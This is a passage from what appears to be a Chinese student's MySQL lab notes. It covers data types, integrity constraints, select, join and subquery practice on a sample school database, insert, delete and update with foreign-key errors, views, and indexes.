d是小数点后面的数字个数。</th></tr></thead><tbody><tr><td>double(m,d)</td><td>双精度浮点型，16位精度(8字节)</td></tr></tbody></table><p>字符型:</p><table><thead><tr><th>char(n)</th><th>固定长度的字符串，最多255个字符</th></tr></thead><tbody><tr><td>varchar(n)</td><td>固定长度的字符串，最多65535个字符</td></tr><tr><td>tinytext</td><td>可变长度字符串，最多255个字符</td></tr><tr><td>text</td><td>可变长度字符串，最多65535个字符</td></tr><tr><td>mediumtext</td><td>可变长度字符串，最多2的24次方-1个字符</td></tr><tr><td>longtext</td><td>可变长度字符串，最多2的32次方-1个字符</td></tr></tbody></table><p><strong>char和varchar：</strong></p><p>1.均可以经过指定n，来限制存储的最大字符数长度，char(20)和varchar(20)将最多只能存储20个字符，超过的字符将会被截掉。n必须小于该类型容许的最大字符数。</p><p>2.char类型指定了n以后，若是存入的字符数小于n，后面将会以空格补齐，查询的时候再将末尾的空格去掉，因此char类型存储的字符串末尾不能有空格，varchar不受此限制。</p><p>\3. 内部存储的机制不一样。char是固定长度，char(4)无论是存一个字符，2个字符或者4个字符（英文的），都将占用4个字节，varchar是存入的 实际字符数+1个字节（n&lt;=255）或2个字节(n&gt;255)，因此varchar(4),存入一个字符将占用2个字节，2个字符占用3个 字节，4个字符占用5个字节。</p><p>4.char类型的字符串检索速度要比varchar类型的快。</p><p><strong>varchar和text：</strong></p><p>1.都是可变长度的，最多能存储65535个字符。</p><p>2.varchar可指定n，text不能指定，内部存储varchar是存入的实际字符数+1个字节（n&lt;=255）或2个字节(n&gt;255)，text是实际字符数+2个字节。</p><p>3.text类型不能有默认值。</p><p>4.varchar可直接建立索引，text建立索引要指定前多少个字符。查询速度varchar要快于text,在都建立了索引的状况下，text的索引好像没起做用，参见这篇文章：<a href="http://www.javashuo.com/link?url=http://forums.mysql.com/read.php?24,105964,105964">http://forums.mysql.com/read.php?24,105964,105964</a></p><p>日期时间类型(date,time,datetime,timestamp)</p><table><thead><tr><th>date</th><th>日期’2008-12-2’</th></tr></thead><tbody><tr><td>time</td><td>时间’12:25:36’</td></tr><tr><td>datetime</td><td>日期时间’2008-12-2 22:06:44’</td></tr><tr><td>timestamp</td><td>不固定</td></tr></tbody></table><ol><li>timestamp比较特殊，若是定义一个字段的类型为timestamp，这个字段的时间会在其余字段修改的时候自动刷新。因此这个数据类型的字段能够存放这条记录最后被修改的时间，而不是真正来的存放时间。</li></ol><p>二进制数据(xxxBlob)：</p><ol><li>XXXBLOB和xxxtext是对应的，不过存储方式不一样，xxxTEXT是以文本方式存储的，若是存储英文的话区分大小写，而xxxBlob是以二进制方式存储的，不区分大小写。</li><li>xxxBlob存储的数据只能总体读出。</li><li>xxxTEXT能够指定字符集，xxxblob不用指定字符集。</li></ol><p>定点数(decimal)：</p><ol><li><p>decimal(m,d)  定点类型,浮点型在数据库中存放的是近似值，而定点类型在数据库中存放的是精确值。参数m是定点类型数字的最大个数（精度），范围为0<del>65，d小数点右侧数字的个数，范围为0</del>30，但不得超过m。</p></li><li><p>对定点数的计算能精确到65位数字。</p></li></ol><p>除此之外还有，<strong>空间数据类型</strong>如: <code>Geometry</code> :可以存储所有的几何类型，<code>Point</code>:简单点，<code>LINESTRING</code>  : 简单线，<code>POLYGON</code>:简单面，<code>MULTIPOINT</code> ：多点，<code>MULITILINESTRING</code>: 多线，<code>MUILITIPOLYGON</code>： 很多方面，<code>GEOMETRYCOLLECTION</code>:任何几何集合</p><h3 id="实验六：MySQL语句实现完整性约束"><a href="#实验六：MySQL语句实现完整性约束" class="headerlink" title="实验六：MySQL语句实现完整性约束"></a>实验六：MySQL语句实现完整性约束</h3><p><strong>一、实验目的</strong></p><p>1.使用mysql语句实现完整性约束。</p><p><strong>二、实验要求</strong></p><p>1.学习了解MySQL的各种约束</p><p>2.学会添加删除约束。</p><p><strong>三、实验过程</strong></p><p>默认值=缺省值=default value</p><p>id int default 1</p><p>使用列级约束：把约束的内容定义在列声明之后</p><p>表级约束：把约束定义放在所有列声明之后。</p><p>约束种类：</p><p>按照约束定义的种类来划分：</p><p>表级和列级约束。两者声明的方式不同，在所有列级约束声明完以后，在最后一行声明表级约束。</p><p>按照约束的内容来划分：</p><blockquote><p>default: 默认约束, 域完整性<br>not null: 非空约束，域完整性<br>unique: 唯一约束，实体完整性<br>primary key: 主键约束，实体完整性<br>foreign key: 外键约束，参照完整性<br>check: 检查约束（MySQL不支持），域完整性<br>auto_increment: 自增长约束<br>unsigned: 无符号约束<br>zerofill: 零填充约束</p></blockquote><p>按照作用的范围来划分：</p><blockquote><p>域完整性（对数据表中字段属性的约束）<br>实体完整性（通过主键约束和候选键位数来实现的）<br>参照完整性（不仅管理自己表的范围，而且涉及到跟别的表的范围，范围很大，MySQL的外键）</p></blockquote><p>复合约束：两个值不能同时一样。a引用b先创建b，先创建被引用的表。<br>添加外键约束：</p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657064735337.png" alt="1657064735337" style="zoom:80%;" /><p>删除约束：</p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657064768883.png" style="zoom:80%;" /><h3 id="实验七：SQL语句-数据查询"><a href="#实验七：SQL语句-数据查询" class="headerlink" title="实验七：SQL语句-数据查询"></a>实验七：SQL语句-数据查询</h3><p><strong>一、实验目的</strong></p><p>掌握利用sql语句进行数据的查询操作</p><p><strong>二、实验要求</strong></p><ol><li>熟练掌握SELECT 语句来查询数据，实现数据的查询操作</li><li>熟练掌握单表查询、分组查询、连接查询、嵌套查询和集合查询的查询方式</li><li>记录实验中遇到的问题和心得，写出实验报告。</li></ol><p><strong>三、实验过程</strong></p><blockquote><p>#SQL：结构化的查询语言<br>#交互式SQL，嵌入式SQL<br>#select 目标表达式列表<br>#from 目标关系列表<br>#where 目标条件列表 -&gt; 条件子句<br>#order by 排序子句<br>#group by 分组子句</p></blockquote><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">use school;select * from student;select sno,sname from student;#重命名select sno as &#39;学号&#39;, sname as &#39;姓名&#39; from student;#as和单引号可省略，单引号使用防止字符有空格select sno 学号,sname as &#39;姓  名&#39; from student;select 2022-sage &#39;出生年份&#39; from student;#不加&#39;出生年份&#39;以&#39;2022-sage&#39;作为列名select 2022-sage  from student;select cno from course;#可跟函数select lower(cno) from course;select upper(cno) from course;#聚集函数&#x2F;统计查询select count(*) from student;select count(*) as &#39;班级人数&#39; from student;#单条件查询whereselect sno,sname,ssex from student where ssex&#x3D;&#39;女&#39;;select sno,sname,ssex,sage from student where sage&lt;&#x3D;30 and ssex&#x3D;&#39;男&#39;;select sno,sname,ssex,sage from student where sage&lt;&#x3D;30 or ssex&#x3D;&#39;男&#39;;#&#39;男&#39;不要加空格,虽然有些软件可以自动去两边空格,仅侥幸select * from student where sdept&#x3D;&#39;计算机系&#39; or sdept&#x3D;&#39;历史系&#39;;#减短查询：查询集合inselect * from student where sdept in (&#39;计算机系&#39;,&#39;音乐系&#39;,&#39;历史系&#39;);select * from student where sage&gt;&#x3D;23 and sage&lt;25;#[23,25)select * from student where not sage&gt;&#x3D;23 and sage&lt;25;select * from student where sage between 23 and 25;#并，闭区间[23,25]，多条件无法实现 #一个for语句遍历所有的行，where为真true才被选中#数据库中第三种状态：除了真假，还有未知select * from course;select * from course where not cpno&#x3D;&#39;C001&#39;; #为空未被选中select * from course where cpno!&#x3D;&#39;C001&#39;; select * from course where cpno&#x3D;null;#无法比较……得到未知select * from course where cpno is null;select * from course where cpno is not null;#方式一select * from course where not (cpno is null);#方式二#只限制前三条查询：起始下标0,偏移量3（网页分页查询使用）select * from student where ssex&#x3D;&#39;男&#39; limit 0,3;#所有的人按系科排序（默认：升序排序asc）-&gt; 字符集utf8 排序规则utf8_binselect * from student order by sdept desc;select * from student order by sdept desc, sage asc;#放最后执行mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验八：分组查询与模糊查询"><a href="#实验八：分组查询与模糊查询" class="headerlink" title="实验八：分组查询与模糊查询"></a>实验八：分组查询与模糊查询</h3><p><strong>一、实验目的</strong></p><ol><li>使用sql语句实现分组查询与模糊查询</li></ol><p><strong>二、实验要求</strong></p><ol><li><p>学会使用group by having条件分组查询</p></li><li><p>学会使用like模糊查询语句</p></li><li><p>学会使用% _通配符与escape的使用</p></li></ol><p><strong>三、实验过程</strong></p><ol><li><p>Mysql like %通配符有% 下划线_和escape三种</p></li><li><p>Mysql like区分大小写：匹配字符时，默认是不区分大小写，如果需要取区分大小写，则需要加入binary操作符，严格区分大小写，按照二进制进行比较</p></li><li><p>当like匹配时加上binary操作符后，则会严格区分英文大小写，因此当检索的内容是中英文混合，则许哟啊忽略英文大小写，使用UPPER(),LOWER()或CONCAT()函数:UPPER()函数将引文字符串变成大写，CONCAT()：将多个字符串连接成一个字符串</p></li><li><p>如果要找出既含有又含有但是不区分顺序的时候可以使用and条件</p></li><li><p>escape通配符：当既需要查%又需要查_时，不能作为通配符使用的时候，使用escape，转义字符后面的%或_就不作为通配符，注意钱买你没有转义字符的%和_仍然可以起到通配符的作用</p></li></ol><p><strong>实验代码：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">use school;select * from student order by sdept asc,sage desc;select * from course where cpno&#x3D;null;#null和任何数字比较得到的结果都是unknown。select * from course where cpno is null;select upper(cno),cname from course;#查阅mysql手册查看各种功能函数#统计查询select count(*) from student group by sdept having 最小年龄&gt;&#x3D;20;#having是对分组进行筛选alter，having必须在group by后面。可以使用别名进行筛选，但是应该用变量名#如果重命名后的变量名有空可以用一对&#96;&#96;包括#模糊查询select * from student where sname like &#39;刘%&#39;;select * from course where cname like &#39;C__程序设计%&#39;;select * from course where cname like &#39;C\_ _程序设计%&#39;;#\的作业是用来转义的，可以使用escape，规定转义字符，如果在查询内容中有\,就应该使用两个\\进行转义select * from course where cname like  &#39;C#__程序设计%&#39;escape &quot;#&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验九：多表查询的链接查询"><a href="#实验九：多表查询的链接查询" class="headerlink" title="实验九：多表查询的链接查询"></a>实验九：多表查询的链接查询</h3><p><strong>一、实验目的</strong></p><p><strong>1.多表查询的连接查询</strong></p><p><strong>2.多表查询的嵌套查询:不相关子查询</strong></p><p><strong>二、实验要求</strong></p><p>学习多表查询的用法，并自主拓展学习</p><p><strong>三、实验过程</strong> </p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#一、单表查询：单表查询，条件查询， #3.is null，is not null，#4.between and ， #5.count(*),min(*)#6.目标表达式：重命名，列名、运算、函数;#7.分组查询 group by  与having子句#8.模糊查询  like escape &quot;&quot;#9.排序 order by someone asc&#x2F;desc#select 目标表达式列表#from 目标关系列表#where 目标条件列表#group by 分组列列表#order by 排序列列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>#多表查询<br>#1.连接查询<br>#最简单链接：笛卡尔积(交叉连接)cross join<br>#内连接inner join…on:一般连接，等值连接，自然连接(公共属性上的等值连接)nature join<br>#外连接：左外连接left join…on，右外连接right join…on，全外连接full join<br>#2.嵌套查询:不相关子查询(干完就跑路)、相关子查询(交错互通，内层查询都要看一下外层查询，外层查询都要看一下内层查询)<br>#不相关子查询(干完就跑路)in(…)<br>#一个值 ‘=’；多个值 ‘in’或’=ANY’<br>#sname&lt;&gt;”刘备”:*不包括刘备<br>#”&gt; ALL” == &gt; max 大于所有的<br>#”&gt; ANY” == &gt;min 大于某一个 P92</p></blockquote><p><strong>#3.集合查询</strong></p><p><strong>待续</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">use school;#单表查询 9&#39;：#简单查询、条件查询、空值查询(is null&#x2F;is not null)、#between and、count(*) min(*)，目标表达式(列名、重名、运算、函数)、#分组查询(group by...having)、模糊查询(like，escape，&quot;\\&quot;)、排序字句(order by...asc&#x2F;desc)#select 目标表达式列表 from 目标关系列表 where 目标条件列表(and,or,not分割) group by 分组列 order by 排序依据列+排序方式select * from sc;select sno from sc where cno&#x3D;&quot;C003&quot;;#找出选修C001也选修C003的同学学号select sno,cno from sc where cno&#x3D;&quot;C001&quot; and cno&#x3D;&quot;C003&quot;;#错的(select sno,cno from sc where cno&#x3D;&quot;C001&quot;) union (select sno,cno from sc where cno&#x3D;&quot;C003&quot;);select sno from sc where cno&#x3D;&quot;C001&quot; and sno in (select sno from sc where cno&#x3D;&quot;C003&quot;);select sc.sno,sname,sc.cno,cname,grade from student,course,sc where student.sno&#x3D;sc.sno and sc.cno&#x3D;course.cno and sc.cno&#x3D;&quot;C003&quot;;#多表查询#1.连接查询select * from student,sc where student.sno&#x3D;sc.sno;select sno,sname from student,sc where student.sno&#x3D;sc.sno and cno&#x3D;&quot;C003&quot;;#Error Code: 1052. Column &#39;sno&#39; in field list is ambiguousselect student.sno,sname from student,sc where student.sno&#x3D;sc.sno and cno&#x3D;&quot;C003&quot;;select sc.sno,sname from (student inner join sc on student.sno&#x3D;sc.sno) where cno&#x3D;&quot;C003&quot;;#最简单链接：笛卡尔积(交叉连接)cross joinselect * from student,sc;select * from student cross join sc;#内连接inner join...on:一般连接，等值连接，自然连接(公共属性上的等值连接)nature join,select * from student inner join sc;select sc.sno,sname from (student inner join sc on student.sno&#x3D;sc.sno) where cno&#x3D;&quot;C003&quot;;select * from student natural join sc;#只剩一行snoselect * from student natural join student;#Error Code: 1066. Not unique table&#x2F;alias: &#39;student&#39;select * from student A natural join student B;#自己与自己自然连接，先相等再去掉一份#外连接：左外连接left join...on，右外连接right join...on，全外连接full joinselect * from student left join sc on student.sno&#x3D;sc.sno;select * from sc right join student on student.sno&#x3D;sc.sno;select * from student full join sc on student.sno&#x3D;sc.sno;#Error Code: 1054. Unknown column &#39;student.sno&#39; in &#39;on clause&#39;select * from student full join sc ;#2.嵌套查询:不相关子查询(干完就跑路)、相关子查询(交错互通，内层查询都要看一下外层查询，外层查询都要看一下内层查询)#不相关子查询(干完就跑路)select sno,sname from student wheresno in (select cno from sc where cno&#x3D;&quot;C003&quot;);select sname from student where sdept&#x3D;(select sdept from student where sname&#x3D;&quot;刘备&quot;);#一个值 ‘&#x3D;’；多个值 ‘in&#39;或&#39;&#x3D;ANY&#39;select sname from student where sname&lt;&gt;&quot;刘备&quot; and sdept&#x3D;(select sdept from student where sname&#x3D;&quot;刘备&quot;);#sname&lt;&gt;&quot;刘备&quot; 不包括刘备select * from student where sdept&lt;&gt;&quot;计算机系&quot; and sage&gt;ANY (select sage from student where sdept&#x3D;&quot;计算机系&quot;);#&quot;&gt; ALL&quot; &#x3D;&#x3D; &gt; max 大于所有的#&quot;&gt; ANY&quot; &#x3D;&#x3D; &gt;min 大于某一个 P92select * from student where sage&gt;&#x3D;(select max(sage) from student where sdept &#x3D;&#39;计算机系&#39;);#等价于select * from student where sage&gt;&#x3D;all(select sage from student where sdept &#x3D;&#39;计算机系&#39;);select * from student where sage&lt;any(select sage from student where sdept &#x3D;&#39;计算机系&#39;);#小于any等价于小于最大值#3.集合查询(select sno,cno from sc where cno&#x3D;&quot;C001&quot;) union (select sno,cno from sc where cno&#x3D;&quot;C003&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验十：相关子查询"><a href="#实验十：相关子查询" class="headerlink" title="实验十：相关子查询"></a>实验十：相关子查询</h3><p><strong>一、实验目的</strong></p><p><strong>1.多表查询的嵌套查询:相关子查询</strong></p><p><strong>二、实验要求</strong></p><p><strong>学习多表查询的用法，并自主拓展学习</strong></p><p><strong>三、实验过程</strong></p><p><strong>#嵌套查询</strong></p><p><strong>#1.不相关子查询</strong></p><p><strong>#2.相关子查询(本节课任务)</strong></p><p><strong>相关子查询(交错互通，内层查询都要看一下外层查询，外层查询都要看一下内层查询)，相关子查询的时间复杂度远大于不相关子查询。</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select sname from student where sname&#x3D;&quot;刘备&quot;;select * from student where sdept&#x3D;(select sdept from student where sname&#x3D;&quot;刘备&quot;) and sname !&#x3D;&quot;刘备&quot;;select * from student a ,student b where a.sname&#x3D;&quot;刘备&quot; and b.sname&lt;&gt;&quot;刘备&quot; and a.sdept&#x3D;b.sdept;select b.sname from student a ,student b where a.sname&#x3D;&quot;刘备&quot; and b.sname&lt;&gt;&quot;刘备&quot; and a.sdept&#x3D;b.sdept;select * from student X where sname&lt;&gt;&quot;刘备&quot; and exists(select * from student Y where sname &#x3D;&quot;刘备&quot; and Y.sdept&#x3D;X.sdept);-- 以这一查询语句为例使用相关子查询的时间复杂度为n2+n(可以认为为n2的时间复杂度)，而实现相同工能的不相关子查询子需要n的时间复杂度#EXISTS() 存在谓词,存在为真,反之为假select sname as &quot;姓名&quot; from student where exists (select * from sc where sno&#x3D;student.sno and cno &#x3D;&quot;C003&quot;);#查询选修了全部课程的学生的信息select * from student where not exists(select * from course where not exists(select * from sc where student.sno &#x3D;sc.sno and sc.cno&#x3D;course.cno));#查询选修了全部学分为2的课程的学生的信息select * from student where not exists(select * from course where credit &#x3D;2 and not exists(select * from sc where student.sno &#x3D;sc.sno and sc.cno&#x3D;course.cno));#查询选修了学号为202006001选修的全部课程的学生的信息select sno from sc X where not exists(select * from sc Y where Y.sno&#x3D;&quot;202006001&quot; and not exists(select * from sc Z where X.sno &#x3D;Z.sno and Y.cno&#x3D;Z.cno));#关系代数在除法的运算在SQL语句中没有对应运算，通过存在谓词表示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验十一：使用MySQL插入，删除，更新语句对数据库进行操作"><a href="#实验十一：使用MySQL插入，删除，更新语句对数据库进行操作" class="headerlink" title="实验十一：使用MySQL插入，删除，更新语句对数据库进行操作"></a>实验十一：使用MySQL插入，删除，更新语句对数据库进行操作</h3><p><strong>一、实验目的</strong></p><ol><li>了解和学会插入删除与更新语句:</li></ol><p><strong>二、实验要求</strong></p><ol><li>正确使用语句，查找实验中的问题并解决</li></ol><p><strong>三、实验过程</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">INSERT INTO &#96;school&#96;.&#96;student&#96; (&#96;sno&#96;, &#96;sname&#96;, &#96;ssex&#96;, &#96;sage&#96;, &#96;sdept&#96;) VALUES (&#39;202006018&#39;, &#39;司马懿&#39;, &#39;男&#39;, &#39;22&#39;, &#39;数学系&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一次执行该程序，该条数据被正确的传入数据库，而在已经插入一次数据之后再次执行会显示</p><blockquote><p>Error Code: 1062. Duplicate entry ‘202006018’ for key ‘student.PRIMARY’</p></blockquote><p>这里的显示数据其实是，因为主码约束的结果，主码发生冲突。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DELETE FROM &#96;school&#96;.&#96;student&#96; WHERE (&#96;sno&#96; &#x3D; &#39;202006018&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将刚刚输入的数据进行删除，第一次执行删除语句，没有出现问题，继续执行该语句删除操作的返回时间发生改变，返回时间为0，但是删除语句成功执行完成</p><p>在SC表中插入司马懿的关联数据</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">INSERT INTO &#96;school&#96;.&#96;sc&#96; (&#96;sno&#96;, &#96;cno&#96;, &#96;grade&#96;) VALUES (&#39;202006018&#39;, &#39;C007&#39;, &#39;90&#39;),(&#39;202006018&#39;, &#39;C006&#39;, &#39;86&#39;),(&#39;202006018&#39;, &#39;C005&#39;, &#39;89&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次执行删除语句</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">反馈为Error Code: 1451. Cannot delete or update a parent row: a foreign key constraint fails (&#96;school&#96;.&#96;sc&#96;, CONSTRAINT &#96;fk_sno&#96; FOREIGN KEY (&#96;sno&#96;) REFERENCES &#96;student&#96; (&#96;sno&#96;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为有外键约束的存在，sc表中的数据sno依赖于student表中的sno，在这种情况下，数据没有成功被删除</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DELETE FROM &#96;school&#96;.&#96;sc&#96; WHERE (&#96;sno&#96; &#x3D; &#39;202006018&#39;) and (&#96;cno&#96; &#x3D; &#39;C005&#39;);DELETE FROM &#96;school&#96;.&#96;sc&#96; WHERE (&#96;sno&#96; &#x3D; &#39;202006018&#39;) and (&#96;cno&#96; &#x3D; &#39;C006&#39;);DELETE FROM &#96;school&#96;.&#96;sc&#96; WHERE (&#96;sno&#96; &#x3D; &#39;202006018&#39;) and (&#96;cno&#96; &#x3D; &#39;C007&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>删除表中关于202006018号学生的信息，再次执行删除语句，数据被成功删除</p><p>在将学生表在的202006018号学生信息删除后，再次执行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">INSERT INTO &#96;school&#96;.&#96;sc&#96; (&#96;sno&#96;, &#96;cno&#96;, &#96;grade&#96;) VALUES (&#39;202006018&#39;, &#39;C007&#39;, &#39;90&#39;),(&#39;202006018&#39;, &#39;C006&#39;, &#39;86&#39;),(&#39;202006018&#39;, &#39;C005&#39;, &#39;89&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">Error Code: 1452. Cannot add or update a child row: a foreign key constraint fails (&#96;school&#96;.&#96;sc&#96;, CONSTRAINT &#96;fk_sno&#96; FOREIGN KEY (&#96;sno&#96;) REFERENCES &#96;student&#96; (&#96;sno&#96;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为外键约束的存在，student表中没有该学号存在，DBMS会拒绝插入语句的执行。</p><p>数据更新相关</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">update sc set grade&#x3D;grade+10;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发生MySQL发生报错，错误信息为Error Code: 1175. You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column.  To disable safe mode, toggle the option in Preferences -&gt; SQL Editor and reconnect. </p><p>根据报错信息上网搜索相关原因 </p><p>报错原因：现在是在mysql的safe-updates模式中，如果where后跟的条件不是主键，就会出现这种错误。</p><p>知道问题，解决方法就简单了，要么where后面加上主键的条件，要么就更改模式：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SET SQL_SAFE_UPDATES &#x3D; 0;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在语句前面增加 SET SQL_SAFE_UPDATES = 0;语句，增加该语句之后之前的语句可以正常执行了，多次执行之后发现数据超过100，估计是一开始数据库建立的时候没有进行约束。</p><h3 id="实验十二：数据库视图的创建与使用"><a href="#实验十二：数据库视图的创建与使用" class="headerlink" title="实验十二：数据库视图的创建与使用"></a>实验十二：数据库视图的创建与使用</h3><p><strong>一、实验目的</strong></p><ol><li>数据库视图的创建和使用</li></ol><p><strong>二、实验要求</strong></p><ol><li><p>了解MySQL数据库视图的创建</p></li><li><p>使用视图功能及使用</p></li></ol><p><strong>三、实验过程</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from student where sdept&#x3D;&quot;计算机系&quot; and sage &gt; 20;-- 为其定义视图，as作为关键字必不可少，select语句作为视图的数据来源create view cs_view as select * from student where sdept&#x3D;&quot;计算机系&quot; and sage &gt; 20;-- 查询视图，对视图的查询实际上是执行定义中基本表的查询select * from cs_view;-- 一个基本表可定义多个视图create or replace view cs_view as select * from student where sdept &#x3D;&quot;计算机系&quot;;-- Select 语句中引用了不可更新的视图Where子句中的子查询，引用from子句中的表；视图与表的区别视图是从一个或多个表（或视图）导出的虚拟表。而表有时也称为基本表——base table。即视图所对应的数据不进行实际存储，数据库中只存储视图的的定义，对视图的数据进行操作时，系统根据视图的定义去操作与视图相关的基本表。在information_schema数据库的tables表中有记录。select * from cs_view;-- create view cs_course_view as select sc.sno,sname,sc.cno,  from student,sc,course create view sage_sdept_view as select avg(sage) ,sdept from student group by sdept;drop view sage_sdept_view;select * from sage_sdept_view;select avg(sage) ,sdept from student group by sdept;INSERT INTO &#96;school&#96;.&#96;cs_view&#96; (&#96;sno&#96;, &#96;sname&#96;, &#96;ssex&#96;, &#96;sage&#96;, &#96;sdept&#96;) VALUES (&#39;202006011&#39;, &#39;赵云&#39;, &#39;男&#39;, &#39;20&#39;, &#39;计算机系&#39;);INSERT INTO &#96;school&#96;.&#96;cs_view&#96; (&#96;sno&#96;, &#96;sname&#96;, &#96;ssex&#96;, &#96;sage&#96;, &#96;sdept&#96;) VALUES (&#39;202006019&#39;, &#39;黄忠&#39;, &#39;男&#39;, &#39;20&#39;, &#39;物理系&#39;);select * from cs_view;create or replace view cs_view as select * from student where sdept &#x3D;&quot;计算机系&quot; with check option;INSERT INTO &#96;school&#96;.&#96;cs_view&#96; (&#96;sno&#96;, &#96;sname&#96;, &#96;ssex&#96;, &#96;sage&#96;, &#96;sdept&#96;) VALUES (&#39;202006019&#39;, &#39;黄忠&#39;, &#39;男&#39;, &#39;20&#39;, &#39;军事系&#39;);INSERT INTO &#96;school&#96;.&#96;cs_view&#96; (&#96;sno&#96;, &#96;sname&#96;, &#96;ssex&#96;, &#96;sage&#96;, &#96;sdept&#96;) VALUES (&#39;202006011&#39;, &#39;赵云&#39;, &#39;男&#39;, &#39;20&#39;, &#39;计算机系&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可更新视图要通过视图更新基本表的数据，必须保证视图是可更新的，既可以在insert update等语句中当中使用它们。对于可更新的视图，在视图中的行为和基本表中的行之间具有一对一的关系。还有一些特定的其他结构，这类结构会使得视图不可更新。</p><p>使用视图有以下优点：</p><p>1为用户集中数据，简化用户的数据查询、修改、删除和更新，2屏蔽数据库的复杂性3简化用户的权限管理，4便于数据共享，5可以重新组织数据以便输出到其他应用程序中；</p><h3 id="实验十三：数据库索引的创建和使用"><a href="#实验十三：数据库索引的创建和使用" class="headerlink" title="实验十三：数据库索引的创建和使用"></a>实验十三：数据库索引的创建和使用</h3><p><strong>一、实验目的</strong></p><p><strong>二、实验要求</strong></p><ol><li><p>了解MySQL数据库索引的创建</p></li><li><p>使用索引功能及使用</p></li></ol><p><strong>三、实验过程</strong></p><p>MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。</p><p>索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。</p><p>创建索引时，你需要确保该索引是应用在 SQL 查询语句的条件(一般作为 WHERE 子句的条件)，实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。</p><p>上面都在说使用索引的好处，但过多的使用索引将会造成滥用。因此索引也会有它的缺点：虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。</p><p>建立索引会占用磁盘空间的索引文件。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE INDEX indexName ON student (ssex);-- 创建索引DROP INDEX indexName ON student; -- 删除索引CREATE TABLE mytable(  ID INT NOT NULL, username VARCHAR(16) NOT NULL,  INDEX indexName (username)   );  -- 创建表的时候直接指定CREATE TABLE mytable(  ID INT NOT NULL,  username VARCHAR(16) NOT NULL,  INDEX [indexName] (username(length))  );  -- 唯一索引 它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一-- CREATE UNIQUE INDEX indexName ON table_name(column_name) ;-- 可以使用 SHOW INDEX 命令来列出表中的相关的索引信息SHOW INDEX FROM student;-- 使用ALTER 命令添加和删除索引-- 有四种方式来添加数据表的索引：ALTER TABLE tbl_name ADD PRIMARY KEY (column_list): # 该语句添加一个主键，这意味着索引值必须是唯一的，且不能为NULL。ALTER TABLE tbl_name ADD UNIQUE index_name (column_list): # 这条语句创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）。ALTER TABLE tbl_name ADD INDEX index_name (column_list): #添加普通索引，索引值可出现多次。ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list):# 该语句指定了索引为 FULLTEXT ，用于全文索引。<span aria-hidden="true" 